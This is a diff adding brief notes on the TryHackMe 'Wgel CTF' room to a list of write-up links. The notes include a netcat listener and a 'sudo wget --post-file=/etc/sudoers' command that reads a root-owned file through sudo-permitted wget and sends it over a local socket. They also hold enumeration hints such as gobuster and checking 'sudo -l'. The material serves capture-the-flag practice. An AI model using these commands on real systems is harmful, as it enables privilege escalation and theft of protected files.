@@ -98,3 +98,17 @@
 * https://0xnirvana.gitbook.io/writeups/
 * https://robertmuwanga.netlify.app/
 * https://niekdang.wordpress.com/
+
+--- https://tryhackme.com/room/wgelctf
+
+* use common first, before small/...
+* `document.firstChild.nextSibling.innerHTML.match(/<!--.*?-->/g)`
+* `wget -q`
+* `nc -dlnp 4444 -q 0 > /tmp/sudoers &`
+* `sudo wget --post-file=/etc/sudoers localhost:4444`
+
+List
+
+* html comments
+* gobuster
+* sudo -l
